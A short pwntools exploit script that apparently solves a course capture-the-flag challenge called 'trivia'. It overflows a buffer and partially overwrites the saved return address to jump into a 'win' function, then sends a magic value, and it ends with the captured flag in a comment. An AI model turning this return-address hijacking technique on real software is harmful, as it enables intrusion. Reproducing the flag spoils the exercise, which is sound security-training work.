from pwn import *

# context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h', '-f']

CHALLENGE = "./trivia"
URL = "offsec-chalbroker.osiris.cyber.nyu.edu"
PORT = 1284
NETID = b"xz4344"
LOCAL = False

if LOCAL:
    p = process(CHALLENGE)
else:
    p = remote(URL, PORT)
    p.recvuntil(b"NetID (something like abc123): ")
    p.sendline(NETID)

# p = gdb.debug(CHALLENGE, '''
#     b questions
#     continue
# ''')

e = ELF(CHALLENGE)
s = asm("endbr64 ; push rbp", arch='amd64')
win_addr = e.symbols.win + len(s)
number = 0xdeadbeefdeadbeef

print(p.recvuntil(b"> ").decode())
msg_1 = b"E" * 0x10 + p64(win_addr)[:2]
p.send(msg_1)
log.info(f"Sending raw bytes: {msg_1}")
log.info(f"Overwriting the return address in the stack to: {hex(win_addr)}")

print(p.recvuntil(b"> ").decode())
msg_2 = p64(number)
p.send(msg_2)
log.info(f"Sending raw bytes: {msg_2}")
log.info(f"Assigning the data's value as: {hex(number)}")

p.interactive()

# flag{4_p4rt14l_0verwr1t3_m1gth_b3_4ll_w3_n33d!_2d735d7adb396ce9}
